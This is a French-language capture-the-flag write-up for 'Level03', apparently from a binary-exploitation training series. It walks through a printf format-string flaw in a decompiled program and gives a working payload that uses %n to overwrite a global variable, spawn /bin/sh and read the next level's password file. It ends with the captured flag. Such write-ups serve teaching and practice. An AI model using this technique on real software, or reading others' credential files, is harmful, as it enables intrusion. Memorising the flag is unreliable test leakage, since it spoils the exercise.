# Rapport CTF - [Level03]

### Observation :
En arrivant sur le level3 on trouve un executable nommé level3.\
Quand nous essayons de le lancer avec un argument le programme nous renvois juste notre propre chaine de caractere puis se ferme, comme sur le level precedant. \
Regardons donc avec gdb ou un decompilateur.


### Explication de Code :
En lancant le binaire dans hex-ray ou ghidra nous obtenons :
```c
int v()
{
  int result; // eax
  char s[520]; // [esp+10h] [ebp-208h] BYREF

  fgets(s, 512, stdin);
  printf(s);
  result = m;
  if ( m == 64 )
  {
    fwrite("Wait what?!\n", 1u, 0xCu, stdout);
    return system("/bin/sh");
  }
  return result;
}
// 804988C: using guessed type int m;

//----- (0804851A) --------------------------------------------------------
int __cdecl main(int argc, const char **argv, const char **envp)
{
  return v();
}
```
Nous avons une fonction `v()` qui sous la condition `m == 64` peux nous donner un `/bin/sh`. \
Nous avon aussi un `printf(s)` qui vas lire tout ce que contient `s`, donc notre `stdin`. \
Nous pouvons injecter des valeurs avec la fonction `%n` de printf qui ecrit le nombre d'octets precedement ecrit par printf. 

### Solution :
Il nous faut donc ecrire 64 octets dans printf, que nous allons injecter dans la variable gllobal `m`.
Pour se faire il nous faut ecrire l'adresse de la global `m`, ainsi que 3 adresses de 8 octects chaqu'une pour pouvoir bien placer notre adresse de `m` dans la memoire.
Par la suite on peux ecrire des octets random jusqu'a atteindres 64 caracteres ecrit par printf et mettre un `%n` pour pouvoir injecter la valeur `64` dans `m`.

On fait la commande suivante pour obtenir le flag :
```sh
(python -c "print ('\x08\x04\x98\x8c'[::-1] + '%8.x'*3 + 'A'*(64 - (8*3) - 4) + '%n')"; echo "cat /home/user/level4/.pass") | ./level3
```

### Resultat :
```sh
�     200b7fd1ac0b7ff37d0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Wait what?!
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```
